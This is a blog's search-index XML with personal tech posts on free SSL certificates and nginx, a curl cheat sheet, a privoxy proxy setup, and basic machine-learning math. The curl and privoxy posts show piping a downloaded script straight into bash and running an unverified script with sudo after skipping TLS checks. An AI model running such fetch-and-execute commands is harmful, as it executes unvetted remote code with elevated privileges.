      
    </entry>
    
    
    
    <entry>
      <title>Get Free SSL Certificates</title>
      <link href="/2019/02/24/020_Get_Free_SSL_Certificates/"/>
      <url>/2019/02/24/020_Get_Free_SSL_Certificates/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Types-of-certificates"><a href="#Types-of-certificates" class="headerlink" title="Types of certificates"></a>Types of certificates</h2><ul><li><code>DV</code> Domain Validated certificates</li><li><code>OV</code> Organization Validated certificate</li><li><code>EV</code> Extended Validation certificates</li></ul><h2 id="Free-ssl-authorities"><a href="#Free-ssl-authorities" class="headerlink" title="Free ssl authorities"></a>Free ssl authorities</h2><ul><li><a href="https://letsencrypt.org" target="_blank" rel="noopener">Let’s Encrypt</a></li><li><a href="https://www.startcomca.com" target="_blank" rel="noopener">StartSSL</a></li><li><a href="https://www.positivessl.com" target="_blank" rel="noopener">COMODO PositiveSSL</a></li><li><a href="https://www.cloudflare.com/ssl/" target="_blank" rel="noopener">CloudFlare SSL</a></li><li><a href="https://www.wosign.com" target="_blank" rel="noopener">Wosign</a></li><li><a href="https://cloud.tencent.com/product/ssl" target="_blank" rel="noopener">Tencent</a></li><li><a href="https://common-buy.aliyun.com/?commodityCode=cas" target="_blank" rel="noopener">Aliyun</a></li><li><a href="https://www.alphassl.com" target="_blank" rel="noopener">AlphaSSL</a></li></ul><h2 id="Guide"><a href="#Guide" class="headerlink" title="Guide"></a>Guide</h2><p>This is a guide to get a DV certificate by <a href="https://letsencrypt.org" target="_blank" rel="noopener">Let’s Encrypt</a> using Certbot</p><h3 id="Install-Certbot"><a href="#Install-Certbot" class="headerlink" title="Install Certbot"></a>Install Certbot</h3><pre><code class="lang-bash">$ wget https://dl.eff.org/certbot-auto$ chmod +x certbot-auto$ mv certbot-auto /usr/local/bin/</code></pre><p>Usage:<br>certonly: A Certbot plugin<br>-d DOMAIN: The domain you want to obtain a certificate for<br>—preferred-challenges: The way to verify your domain<br>—server: ACME v1 or v2 protocol server</p><h3 id="Apply-for-ssl-certificate"><a href="#Apply-for-ssl-certificate" class="headerlink" title="Apply for ssl certificate"></a>Apply for ssl certificate</h3><pre><code class="lang-bash">$ certbot-auto certonly -d &quot;domain.com&quot; --manual --preferred-challenges dns-01 --server https://acme-v02.api.letsencrypt.org/directory</code></pre><p>Follow the hits and add a TXT dns record. Then you will get your certificates at /etc/letsencrypt/live/yourdomain/</p><h3 id="Enable-HTTPS"><a href="#Enable-HTTPS" class="headerlink" title="Enable HTTPS"></a>Enable HTTPS</h3><p>Here is my nginx config file</p><pre><code class="lang-config">user root;worker_processes 2;error_log /var/log/nginx/error.log;pid /root/app/nginx.pid;events {    worker_connections 1024;}http {    include            mime.types;    default_type       application/octet-stream;    sendfile           on;    keepalive_timeout  65;    server {        listen 443 http2 ssl;         server_name vincentstudio.info;        ssl_certificate         /root/app/cert/vincentstudio.info/fullchain.pem;        ssl_certificate_key     /root/app/cert/vincentstudio.info/privkey.pem;        ssl_trusted_certificate /root/app/cert/vincentstudio.info/chain.pem;        root /root/app/blogger;        location / {            root   /root/app/blogger;            index  index.html index.htm;            autoindex on;            autoindex_exact_size on;            autoindex_localtime on;        }    }    server {        listen 80;        server_name vincentstudio.info;        return 301 https://vincentstudio.info;    }}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://community.digicert.com/en/blogs.entry.html/2014/08/11/types-of-ssl-certificateschoose-the-right-one.html" target="_blank" rel="noopener">Types of SSL certificates – choose the right one</a><br>[2] <a href="https://www.hi-linux.com/posts/6968.html" target="_blank" rel="noopener">Let’s Encrypt 免费通配符 SSL 证书申请流程</a></p>]]></content>
      
      
      <categories>
          
          <category> Solutions </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Curl Tutorial</title>
      <link href="/2019/02/22/019_Curl_CheatSheet/"/>
      <url>/2019/02/22/019_Curl_CheatSheet/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Common-Usage"><a href="#Common-Usage" class="headerlink" title="Common Usage"></a>Common Usage</h2><h3 id="Demo1-Access-a-website-or-script"><a href="#Demo1-Access-a-website-or-script" class="headerlink" title="Demo1: Access a website or script"></a>Demo1: Access a website or script</h3><pre><code class="lang-bash">$ curl -4sSqL https://baidu.com$ curl -fsSL http://somewhere/yourscript.sh | /bin/bash$ curl -fsSL http://somewhere/yourscript.sh | /bin/bash -s parm1 parm2</code></pre><p>-4: Use ipv4<br>-s: Silent mode, don’t show progress meter or error messages<br>-S: Show error<br>-q: Disable .curlrc (default settings)<br>-L: Follow redirects (301, 302 …)<br>-f: Output nothing on http errors</p><h3 id="Demo2-Debug"><a href="#Demo2-Debug" class="headerlink" title="Demo2: Debug"></a>Demo2: Debug</h3><pre><code class="lang-bash">$ curl -i https://baidu.com$ curl -I https://baidu.com$ curl -v https://baidu.com$ curl -vv https://baidu.com$ curl -o output.txt https://baidu.com</code></pre><p>-i: Show response header<br>-I: Show response header only<br>-v: Show verbose<br>-vv: Show more verbose<br>-o: Write to file</p><h3 id="Demo3-Set-request-methods"><a href="#Demo3-Set-request-methods" class="headerlink" title="Demo3: Set request methods"></a>Demo3: Set request methods</h3><pre><code class="lang-bash">$ curl -X POST localhost:8080/user</code></pre><p>-X: Set request method, [GET, POST, PUT, DELETE …]</p><h3 id="Demo4-Set-request-header"><a href="#Demo4-Set-request-header" class="headerlink" title="Demo4: Set request header"></a>Demo4: Set request header</h3><pre><code class="lang-bash">$ curl \  -H &#39;User-Agent: Mozilla/5.0&#39; \  -H &#39;Accept: application/json&#39; \  http://localhost:8080/api/v1/foobar $ curl -A &#39;Mozilla/5.0&#39; http://localhost:8080/api/v1/foobar $ curl -b name=admin http://localhost:8080/api/v1/foobar $ curl --compressed http://localhost:8080/api/v1/foobar</code></pre><p>-H: Set request header<br>-A: Equals -H ‘User-Agent:’<br>-b: Equals -H ‘Cookie:’<br>—compressed: Equals -H ‘Accept-Encoding: deflate, gzip’</p><h3 id="Demo5-Send-data"><a href="#Demo5-Send-data" class="headerlink" title="Demo5: Send data"></a>Demo5: Send data</h3><ul><li>x-www-form-urlencoded</li></ul><pre><code class="lang-bash">$ curl -d &#39;key1=val1&amp;key2=val2&#39; http://localhost:8080/api/v1/foobar$ curl -d @data.txt http://localhost:8080/api/v1/foobar</code></pre><ul><li>json</li></ul><pre><code class="lang-bash">$ curl -d &#39;{&quot;key&quot;: &quot;value&quot;}&#39; -H &#39;Content-Type:application/json&#39; \http://localhost:8080/api/v1/foobar</code></pre><ul><li>multipart/form-data</li></ul><pre><code class="lang-bash">$ curl \-F field1=test \-F logo.jpg=@logo.jpg \http://localhost:8080/api/v1/foobar</code></pre><h3 id="Demo6-Proxy"><a href="#Demo6-Proxy" class="headerlink" title="Demo6: Proxy"></a>Demo6: Proxy</h3><pre><code class="lang-bash"># sock5 proxy$ curl -x socks5h://127.0.0.1:1086 https://google.com# http proxy$ curl -x http://127.0.0.1:1087 https://google.com</code></pre><p>-x: Set proxy</p><h2 id="Full-feature"><a href="#Full-feature" class="headerlink" title="Full feature"></a>Full feature</h2><pre><code class="lang-bash">&#39;&#39;&#39;Usage: curl [options...] &lt;url&gt;Options: (H) means HTTP/HTTPS only, (F) means FTP only     --anyauth       Pick &quot;any&quot; authentication method (H) -a, --append        Append to target file when uploading (F/SFTP)     --basic         Use HTTP Basic Authentication (H)     --cacert FILE   CA certificate to verify peer against (SSL)     --capath DIR    CA directory to verify peer against (SSL) -E, --cert CERT[:PASSWD]  Client certificate file and password (SSL)     --cert-status   Verify the status of the server certificate (SSL)     --cert-type TYPE  Certificate file type (DER/PEM/ENG) (SSL)     --ciphers LIST  SSL ciphers to use (SSL)     --compressed    Request compressed response (using deflate or gzip) -K, --config FILE   Read config from FILE     --connect-timeout SECONDS  Maximum time allowed for connection     --connect-to HOST1:PORT1:HOST2:PORT2 Connect to host (network level) -C, --continue-at OFFSET  Resumed transfer OFFSET -b, --cookie STRING/FILE  Read cookies from STRING/FILE (H) -c, --cookie-jar FILE  Write cookies to FILE after operation (H)     --create-dirs   Create necessary local directory hierarchy     --crlf          Convert LF to CRLF in upload     --crlfile FILE  Get a CRL list in PEM format from the given file -d, --data DATA     HTTP POST data (H)     --data-raw DATA  HTTP POST data, &#39;@&#39; allowed (H)     --data-ascii DATA  HTTP POST ASCII data (H)     --data-binary DATA  HTTP POST binary data (H)     --data-urlencode DATA  HTTP POST data url encoded (H)     --delegation STRING  GSS-API delegation permission     --digest        Use HTTP Digest Authentication (H)     --disable-eprt  Inhibit using EPRT or LPRT (F)     --disable-epsv  Inhibit using EPSV (F)     --dns-servers   DNS server addrs to use: 1.1.1.1;2.2.2.2     --dns-interface  Interface to use for DNS requests     --dns-ipv4-addr  IPv4 address to use for DNS requests, dot notation     --dns-ipv6-addr  IPv6 address to use for DNS requests, dot notation -D, --dump-header FILE  Write the received headers to FILE     --egd-file FILE  EGD socket path for random data (SSL)     --engine ENGINE  Crypto engine (use &quot;--engine list&quot; for list) (SSL)     --expect100-timeout SECONDS How long to wait for 100-continue (H) -f, --fail          Fail silently (no output at all) on HTTP errors (H)     --fail-early    Fail on first transfer error, do not continue     --false-start   Enable TLS False Start. -F, --form CONTENT  Specify HTTP multipart POST data (H)     --form-string STRING  Specify HTTP multipart POST data (H)     --ftp-account DATA  Account data string (F)     --ftp-alternative-to-user COMMAND  String to replace &quot;USER [name]&quot; (F)     --ftp-create-dirs  Create the remote dirs if not present (F)     --ftp-method [MULTICWD/NOCWD/SINGLECWD]  Control CWD usage (F)     --ftp-pasv      Use PASV/EPSV instead of PORT (F) -P, --ftp-port ADR  Use PORT with given address instead of PASV (F)     --ftp-skip-pasv-ip  Skip the IP address for PASV (F)     --ftp-pret      Send PRET before PASV (for drftpd) (F)     --ftp-ssl-ccc   Send CCC after authenticating (F)     --ftp-ssl-ccc-mode ACTIVE/PASSIVE  Set CCC mode (F)     --ftp-ssl-control  Require SSL/TLS for FTP login, clear for transfer (F) -G, --get           Send the -d data with a HTTP GET (H) -g, --globoff       Disable URL sequences and ranges using {} and [] -H, --header LINE   Pass custom header LINE to server (H) -I, --head          Show document info only -h, --help          This help text     --hostpubmd5 MD5  Hex-encoded MD5 string of the host public key. (SSH) -0, --http1.0       Use HTTP 1.0 (H)     --http1.1       Use HTTP 1.1 (H)     --http2         Use HTTP 2 (H)     --http2-prior-knowledge  Use HTTP 2 without HTTP/1.1 Upgrade (H)     --ignore-content-length  Ignore the HTTP Content-Length header -i, --include       Include protocol headers in the output (H/F) -k, --insecure      Allow connections to SSL sites without certs (H)     --interface INTERFACE  Use network INTERFACE (or address) -4, --ipv4          Resolve name to IPv4 address -6, --ipv6          Resolve name to IPv6 address -j, --junk-session-cookies  Ignore session cookies read from file (H)     --keepalive-time SECONDS  Wait SECONDS between keepalive probes     --key KEY       Private key file name (SSL/SSH)     --key-type TYPE  Private key file type (DER/PEM/ENG) (SSL)     --krb LEVEL     Enable Kerberos with security LEVEL (F)     --libcurl FILE  Dump libcurl equivalent code of this command line     --limit-rate RATE  Limit transfer speed to RATE -l, --list-only     List only mode (F/POP3)     --local-port RANGE  Force use of RANGE for local port numbers -L, --location      Follow redirects (H)     --location-trusted  Like &#39;--location&#39;, and send auth to other hosts (H)     --login-options OPTIONS  Server login options (IMAP, POP3, SMTP) -M, --manual        Display the full manual     --mail-from FROM  Mail from this address (SMTP)     --mail-rcpt TO  Mail to this/these addresses (SMTP)     --mail-auth AUTH  Originator address of the original email (SMTP)     --max-filesize BYTES  Maximum file size to download (H/F)     --max-redirs NUM  Maximum number of redirects allowed (H) -m, --max-time SECONDS  Maximum time allowed for the transfer     --metalink      Process given URLs as metalink XML file     --negotiate     Use HTTP Negotiate (SPNEGO) authentication (H) -n, --netrc         Must read .netrc for user name and password     --netrc-optional  Use either .netrc or URL; overrides -n     --netrc-file FILE  Specify FILE for netrc -:, --next          Allows the following URL to use a separate set of options     --no-alpn       Disable the ALPN TLS extension (H) -N, --no-buffer     Disable buffering of the output stream     --no-keepalive  Disable keepalive use on the connection     --no-npn        Disable the NPN TLS extension (H)     --no-sessionid  Disable SSL session-ID reusing (SSL)     --noproxy       List of hosts which do not use proxy     --ntlm          Use HTTP NTLM authentication (H)     --ntlm-wb       Use HTTP NTLM authentication with winbind (H)     --oauth2-bearer TOKEN  OAuth 2 Bearer Token (IMAP, POP3, SMTP) -o, --output FILE   Write to FILE instead of stdout     --pass PASS     Pass phrase for the private key (SSL/SSH)     --path-as-is    Do not squash .. sequences in URL path     --pinnedpubkey FILE/HASHES Public key to verify peer against (SSL)     --post301       Do not switch to GET after following a 301 redirect (H)     --post302       Do not switch to GET after following a 302 redirect (H)     --post303       Do not switch to GET after following a 303 redirect (H)     --preproxy [PROTOCOL://]HOST[:PORT] Proxy before HTTP(S) proxy -#, --progress-bar  Display transfer progress as a progress bar     --proto PROTOCOLS  Enable/disable PROTOCOLS     --proto-default PROTOCOL  Use PROTOCOL for any URL missing a scheme     --proto-redir PROTOCOLS   Enable/disable PROTOCOLS on redirect -x, --proxy [PROTOCOL://]HOST[:PORT]  Use proxy on given port     --proxy-anyauth  Pick &quot;any&quot; proxy authentication method (H)     --proxy-basic   Use Basic authentication on the proxy (H)     --proxy-digest  Use Digest authentication on the proxy (H)     --proxy-cacert FILE CA certificate to verify peer against for proxy (SSL)     --proxy-capath DIR CA directory to verify peer against for proxy (SSL)     --proxy-cert CERT[:PASSWD] Client certificate file and password for proxy (SSL)     --proxy-cert-type TYPE Certificate file type (DER/PEM/ENG) for proxy (SSL)     --proxy-ciphers LIST SSL ciphers to use for proxy (SSL)     --proxy-crlfile FILE Get a CRL list in PEM format from the given file for proxy     --proxy-insecure Allow connections to SSL sites without certs for proxy (H)     --proxy-key KEY Private key file name for proxy (SSL)     --proxy-key-type TYPE Private key file type for proxy (DER/PEM/ENG) (SSL)     --proxy-negotiate  Use HTTP Negotiate (SPNEGO) authentication on the proxy (H)     --proxy-ntlm    Use NTLM authentication on the proxy (H)     --proxy-header LINE Pass custom header LINE to proxy (H)     --proxy-pass PASS Pass phrase for the private key for proxy (SSL)     --proxy-ssl-allow-beast Allow security flaw to improve interop for proxy (SSL)     --proxy-tlsv1   Use TLSv1 for proxy (SSL)     --proxy-tlsuser USER TLS username for proxy     --proxy-tlspassword STRING TLS password for proxy     --proxy-tlsauthtype STRING TLS authentication type for proxy (default SRP)     --proxy-service-name NAME  SPNEGO proxy service name     --service-name NAME  SPNEGO service name -U, --proxy-user USER[:PASSWORD]  Proxy user and password     --proxy1.0 HOST[:PORT]  Use HTTP/1.0 proxy on given port -p, --proxytunnel   Operate through a HTTP proxy tunnel (using CONNECT)     --pubkey KEY    Public key file name (SSH) -Q, --quote CMD     Send command(s) to server before transfer (F/SFTP)     --random-file FILE  File for reading random data from (SSL) -r, --range RANGE   Retrieve only the bytes within RANGE     --raw           Do HTTP &quot;raw&quot;; no transfer decoding (H) -e, --referer       Referer URL (H) -J, --remote-header-name  Use the header-provided filename (H) -O, --remote-name   Write output to a file named as the remote file     --remote-name-all  Use the remote file name for all URLs -R, --remote-time   Set the remote file&#39;s time on the local output -X, --request COMMAND  Specify request command to use     --resolve HOST:PORT:ADDRESS  Force resolve of HOST:PORT to ADDRESS     --retry NUM   Retry request NUM times if transient problems occur     --retry-connrefused  Retry on connection refused (use with --retry)     --retry-delay SECONDS  Wait SECONDS between retries     --retry-max-time SECONDS  Retry only within this period     --sasl-ir       Enable initial response in SASL authentication -S, --show-error    Show error. With -s, make curl show errors when they occur -s, --silent        Silent mode (don&#39;t output anything)     --socks4 HOST[:PORT]  SOCKS4 proxy on given host + port     --socks4a HOST[:PORT]  SOCKS4a proxy on given host + port     --socks5 HOST[:PORT]  SOCKS5 proxy on given host + port     --socks5-hostname HOST[:PORT]  SOCKS5 proxy, pass host name to proxy     --socks5-gssapi-service NAME  SOCKS5 proxy service name for GSS-API     --socks5-gssapi-nec  Compatibility with NEC SOCKS5 server -Y, --speed-limit RATE  Stop transfers below RATE for &#39;speed-time&#39; secs -y, --speed-time SECONDS  Trigger &#39;speed-limit&#39; abort after SECONDS (default: 30)     --ssl           Try SSL/TLS (FTP, IMAP, POP3, SMTP)     --ssl-reqd      Require SSL/TLS (FTP, IMAP, POP3, SMTP) -2, --sslv2         Use SSLv2 (SSL) -3, --sslv3         Use SSLv3 (SSL)     --ssl-allow-beast  Allow security flaw to improve interop (SSL)     --ssl-no-revoke    Disable cert revocation checks (WinSSL)     --stderr FILE   Where to redirect stderr (use &quot;-&quot; for stdout)     --suppress-connect-headers  Suppress proxy CONNECT response headers     --tcp-nodelay   Use the TCP_NODELAY option     --tcp-fastopen  Use TCP Fast Open -t, --telnet-option OPT=VAL  Set telnet option     --tftp-blksize VALUE  Set TFTP BLKSIZE option (must be &gt;512)     --tftp-no-options  Do not send TFTP options requests -z, --time-cond TIME   Transfer based on a time condition -1, --tlsv1         Use &gt;= TLSv1 (SSL)     --tlsv1.0       Use TLSv1.0 (SSL)     --tlsv1.1       Use TLSv1.1 (SSL)     --tlsv1.2       Use TLSv1.2 (SSL)     --tlsv1.3       Use TLSv1.3 (SSL)     --tls-max VERSION  Use TLS up to VERSION (SSL)     --trace FILE    Write a debug trace to FILE     --trace-ascii FILE  Like --trace, but without hex output     --trace-time    Add time stamps to trace/verbose output     --tr-encoding   Request compressed transfer encoding (H) -T, --upload-file FILE  Transfer FILE to destination     --url URL       URL to work with -B, --use-ascii     Use ASCII/text transfer -u, --user USER[:PASSWORD]  Server user and password     --tlsuser USER  TLS username     --tlspassword STRING  TLS password     --tlsauthtype STRING  TLS authentication type (default: SRP)     --unix-socket PATH    Connect through this Unix domain socket     --abstract-unix-socket PATH Connect to an abstract Unix domain socket -A, --user-agent STRING  Send User-Agent STRING to server (H) -v, --verbose       Make the operation more talkative -V, --version       Show version number and quit -w, --write-out FORMAT  Use output FORMAT after completion     --xattr         Store metadata in extended file attributes -q, --disable       Disable .curlrc (must be first parameter) &#39;&#39;&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Configure system proxy by privoxy + gfwlist</title>
      <link href="/2019/02/20/018_Configure_system_proxy_by_privoxy_and_gfwlist/"/>
      <url>/2019/02/20/018_Configure_system_proxy_by_privoxy_and_gfwlist/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Configure-Privoxy"><a href="#Configure-Privoxy" class="headerlink" title="Configure Privoxy"></a>Configure Privoxy</h2><p>OS: Ubuntu 16.04</p><h3 id="Install-privoxy"><a href="#Install-privoxy" class="headerlink" title="Install privoxy"></a>Install privoxy</h3><pre><code class="lang-bash">$ sudo apt-get install privoxy</code></pre><h3 id="Convert-gfwlist-to-privoxy-action-file"><a href="#Convert-gfwlist-to-privoxy-action-file" class="headerlink" title="Convert gfwlist to privoxy action file"></a>Convert gfwlist to privoxy action file</h3><pre><code class="lang-bash">$ curl -skL https://raw.github.com/zfl9/gfwlist2privoxy/master/gfwlist2privoxy -o gfwlist2privoxy$ sudo bash gfwlist2privoxy &#39;127.0.0.1:1080&#39; # sslocal port$ sudo cp -af gfwlist.action /etc/privoxy/</code></pre><p>edit /etc/privoxy/config, add following lines</p><pre><code class="lang-bash">listen-address 127.0.0.1:8118 # expose http proxy portactionsfile /etc/privoxy/gfwlist.action # gfwlist</code></pre><h3 id="Restart-privoxy-service"><a href="#Restart-privoxy-service" class="headerlink" title="Restart privoxy service"></a>Restart privoxy service</h3><pre><code class="lang-bash">$ sudo service privoxy restart</code></pre><h2 id="Set-system-proxy"><a href="#Set-system-proxy" class="headerlink" title="Set system proxy"></a>Set system proxy</h2><p>edit /etc/environment, add following lines</p><pre><code class="lang-bash">export http_proxy=&quot;http://127.0.0.1:8118&quot;export https_proxy=&quot;http://127.0.0.1:8118&quot;export no_proxy=&quot;localhost, 127.0.0.1, ::1, ip.cn&quot;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="lang-bash">$ curl -4skL https://www.google.com$ curl -4skL https://www.baidu.com</code></pre>]]></content>
      
      
      <categories>
          
          <category> Solutions </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gradient Descent (梯度下降)</title>
      <link href="/2019/02/18/017_Gradient_Descent/"/>
      <url>/2019/02/18/017_Gradient_Descent/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h2><p><a href="/2019/02/16/016%20Logistic%20Regression%20(逻辑回归)/">Logistic Regression:</a></p><p>$\hat{y}=\sigma ( w^{\tau}x + b )$, $\sigma(z) = \dfrac{1}{1+e^{-z}}$</p><script type="math/tex;mode=display">J(w,b) = \dfrac{1}{m} \sum\limits_{i=1}^{m} L(\hat{y}^{(i)}, y^{(i)}) = -\dfrac{1}{m} \sum\limits_{i=1}^{m} (y^{(i)}log\hat{y}^{(i)} + (1-y^{(i)})log(1-\hat{y}^{(i)}))</script><p>Want to find $w,b$ that minimize $J(w,b)$</p><h2 id="Gradient-Descent"><a href="#Gradient-Descent" class="headerlink" title="Gradient Descent"></a>Gradient Descent</h2><p>Suppose $\alpha$ is learning rate, then loop:</p><p>$w = w - \alpha \dfrac{\partial J(w,b)}{\partial w}$</p><p>$b = b - \alpha \dfrac{\partial J(w,b)}{\partial b}$</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Logistic Regression (逻辑回归)</title>
      <link href="/2019/02/16/016_Logistic_Regression/"/>
      <url>/2019/02/16/016_Logistic_Regression/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Given $x \in R^{n_x}$, want $\hat{y}=P(y=1\,|\,x) \in [0,1]$</p><h2 id="Logistic-Function"><a href="#Logistic-Function" class="headerlink" title="Logistic Function"></a>Logistic Function</h2><p>$\sigma(z) = \dfrac{1}{1+e^{-z}}$</p><img src="/2019/02/16/016_Logistic_Regression/Sigmoid.png"><p>Suppose $w \in R^{n_x},\;b \in R$<br>$\hat{y}=\sigma ( w^{\tau}x + b )$</p><p>So $w$ and $b$ are the parameters we want to train</p><h2 id="Logistic-Regression-Cost-Function"><a href="#Logistic-Regression-Cost-Function" class="headerlink" title="Logistic Regression Cost Function"></a>Logistic Regression Cost Function</h2><p>$\hat{y}=\sigma ( w^{\tau}x + b )$, where $\sigma(z) = \dfrac{1}{1+e^{-z}}$<br>Given ${(x^{(1)},y^{(1)}),(x^{(2)},y^{(2)}),\;…\;,(x^{(m)},y^{(m)})}$, want $\hat{y}^{(i)} \approx y^{(i)}$</p><h3 id="Mean-squared-error-均方误差"><a href="#Mean-squared-error-均方误差" class="headerlink" title="Mean squared error (均方误差)"></a>Mean squared error (均方误差)</h3><p>$L(\hat{y}, y) = \dfrac{1}{2} (\hat{y} - y)^2$</p><p>We don’t use Mean squared error in Logistic Regression. Because that will make the cost function is no-convex.</p><h3 id="Cross-Entropy-交叉熵"><a href="#Cross-Entropy-交叉熵" class="headerlink" title="Cross Entropy (交叉熵)"></a>Cross Entropy (交叉熵)</h3><p>$L(\hat{y}, y) = -(ylog\hat{y} + (1-y)log(1-\hat{y}))$</p><h2 id="Cost-Function"><a href="#Cost-Function" class="headerlink" title="Cost Function"></a>Cost Function</h2><script type="math/tex;mode=display">J(w,b) = \dfrac{1}{m} \sum\limits_{i=1}^{m} L(\hat{y}^{(i)}, y^{(i)}) = -\dfrac{1}{m} \sum\limits_{i=1}^{m} (y^{(i)}log\hat{y}^{(i)} + (1-y^{(i)})log(1-\hat{y}^{(i)}))</script><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://zhuanlan.zhihu.com/p/28408516" target="_blank" rel="noopener">逻辑回归（Logistic Regression）（一）</a><br>[2] <a href="https://zhuanlan.zhihu.com/p/28415991" target="_blank" rel="noopener">逻辑回归（Logistic Regression）（二）</a><br>[3] <a href="https://www.jianshu.com/p/1bf35d61995f" target="_blank" rel="noopener">Logistic Regression 为什么用极大似然函数</a></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 展示数学公式 | hexo-renderer-mathjax</title>
      <link href="/2019/02/15/015_Render_math_formula_in_hexo/"/>
      <url>/2019/02/15/015_Render_math_formula_in_hexo/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><script type="math/tex;mode=display">\begin{equation} \begin{array}{lll}\nabla\times E &=& -\;\frac{\partial{B}}{\partial{t}}\     \nabla\times H &=& \frac{\partial{D}}{\partial{t}}+J\     \nabla\cdot D &=& \rho\     \nabla\cdot B &=& 0\ \end{array}\end{equation}</script><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Use-hexo-renderer-kramed"><a href="#Use-hexo-renderer-kramed" class="headerlink" title="Use hexo-renderer-kramed"></a>Use hexo-renderer-kramed</h3><pre><code class="lang-bash">$ npm uninstall hexo-renderer-marked --save$ npm install hexo-renderer-kramed --save</code></pre><h3 id="Insatll-mathjax"><a href="#Insatll-mathjax" class="headerlink" title="Insatll mathjax"></a>Insatll mathjax</h3><pre><code class="lang-bash">$ npm uninstall hexo-math --save$ npm install hexo-renderer-mathjax --save</code></pre><h3 id="Fix-mathjax-CDN"><a href="#Fix-mathjax-CDN" class="headerlink" title="Fix mathjax CDN"></a>Fix mathjax CDN</h3><p>edit /node_modules/hexo-renderer-mathjax/mathjax.html</p><pre><code class="lang-html">&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;&gt;&lt;/script&gt;</code></pre><h3 id="Fix-escape-bugs"><a href="#Fix-escape-bugs" class="headerlink" title="Fix escape bugs"></a>Fix escape bugs</h3><p>edit /node_modules/kramed/lib/rules/inline.js<br>find <code>escape</code> &amp; <code>em</code> regexp and change to</p><pre><code class="lang-text">escape: /^\\([`*\[\]()# +\-.!_&gt;])/,em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</code></pre><h2 id="Enjoy-LaTeX"><a href="#Enjoy-LaTeX" class="headerlink" title="Enjoy LaTeX"></a>Enjoy LaTeX</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><pre><code>$$\left\{\begin{matrix}1 &amp; 2 &amp; 3 \\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{matrix}\right\}$$</code></pre><script type="math/tex;mode=display">\left\{\begin{matrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9\end{matrix}\right\}</script>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> FrontEnd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning 学习资料</title>
      <link href="/2019/02/14/014_Deep_Learning_Resources/"/>
      <url>/2019/02/14/014_Deep_Learning_Resources/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><p>Andrew Ng 深度学习课程<br>视频地址：<a href="https://mooc.study.163.com/smartSpec/detail/1001319001.htm" target="_blank" rel="noopener">https://mooc.study.163.com/smartSpec/detail/1001319001.htm</a><br>离线下载：<a href="https://pan.baidu.com/s/1ciq3qHo0lgoD3MLRwfeqnA" target="_blank" rel="noopener">https://pan.baidu.com/s/1ciq3qHo0lgoD3MLRwfeqnA</a> 密码：0kim<br>课程笔记：<a href="https://github.com/fengdu78/deeplearning_ai_books" target="_blank" rel="noopener">https://github.com/fengdu78/deeplearning_ai_books</a></p></li><li><p>莫凡 Tensorflow 教程<br><a href="https://morvanzhou.github.io/tutorials/machine-learning/tensorflow/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/machine-learning/tensorflow/</a></p></li><li><p>TensorFlow 官方教程<br><a href="https://www.tensorflow.org/tutorials" target="_blank" rel="noopener">https://www.tensorflow.org/tutorials</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
